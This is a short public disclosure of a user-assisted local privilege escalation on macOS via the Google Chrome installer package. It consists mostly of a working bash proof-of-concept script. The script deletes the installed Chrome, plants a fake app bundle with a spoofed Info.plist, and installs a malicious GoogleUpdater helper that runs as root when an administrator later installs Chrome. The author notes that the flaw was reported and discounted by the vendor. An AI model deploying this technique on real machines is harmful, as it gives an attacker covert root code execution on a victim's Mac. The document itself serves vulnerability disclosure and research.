## macOS User-assisted Local Privilege Escalation when installing Google Chrome


1. run the prepare script (`lpe.sh`)
2. wait till a legitemate administrator installs the Google Chrome via the installer package.
3. root code executed without the user knowing.


```sh
#!/bin/bash
# Google Chrome Local Privilege Escalation via installer package
# Author: Kun Peeks (@SwayZGl1tZyyy)
# sunday 1 february 2026 (01-02-2026)
set -e

APP_PATH="/Applications/Google Chrome.app"
FAKE_BUNDLE_ID="com.fake.chrome"

echo "[*] Creating malicious setup..."

# rm existing
rm -rf "$APP_PATH"

# create full malicious structure zoals eerder
mkdir -p "$APP_PATH/Contents/MacOS"
mkdir -p "$APP_PATH/Contents/Frameworks/Google Chrome Framework.framework/Helpers/GoogleUpdater.app/Contents/MacOS"

# maclicous GoogleUpdater
cat > "$APP_PATH/Contents/Frameworks/Google Chrome Framework.framework/Helpers/GoogleUpdater.app/Contents/MacOS/GoogleUpdater" << 'EOF'
#!/bin/bash
{
    echo "The vicitm has installed Google Chrome via the package installer"
    echo "Executed as: $(whoami)"
    echo "UID: $(id -u)"
    id
    date
} > /tmp/chrome_pwned.txt
chmod 644 /tmp/chrome_pwned.txt
logger "Chrome LPE PoC executed as $(whoami)"
# Don't exit immediately - let GoogleUpdater think it worked
sleep 2
EOF
chmod +x "$APP_PATH/Contents/Frameworks/Google Chrome Framework.framework/Helpers/GoogleUpdater.app/Contents/MacOS/GoogleUpdater"

# create fake main binary
cat > "$APP_PATH/Contents/MacOS/Google Chrome" << 'EOF'
#!/bin/bash
echo "Fake Chrome"
EOF
chmod +x "$APP_PATH/Contents/MacOS/Google Chrome"

# Info.plist with fake bundle ID to trigger .localized
cat > "$APP_PATH/Contents/Info.plist" << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>CFBundleIdentifier</key>
    <string>${FAKE_BUNDLE_ID}</string>
    <key>CFBundleName</key>
    <string>Google Chrome</string>
    <key>CFBundleShortVersionString</key>
    <string>120.0.0.0</string>
    <key>CFBundleVersion</key>
    <string>120.0.0.0</string>
    <key>CFBundleExecutable</key>
    <string>Google Chrome</string>
    <key>KSProductID</key>
    <string>com.google.Chrome</string>
    <key>KSVersion</key>
    <string>120.0.0.0</string>
</dict>
</plist>
EOF

echo "[+] setup complete!"
echo "[!] now wait till an administrator installs Google Chrome .pkg"
echo "[!] after install, check: cat /tmp/chrome_pwned.txt"
```


#### disclosure

I'm dislosing this because Google doesn't see admin->root as a valid local privilege escalation... So they fixing this vulnerability as a bug with no security impact. (Lol)

A bit unfortunate that I reported this, as this could've been very useful for red teamers.


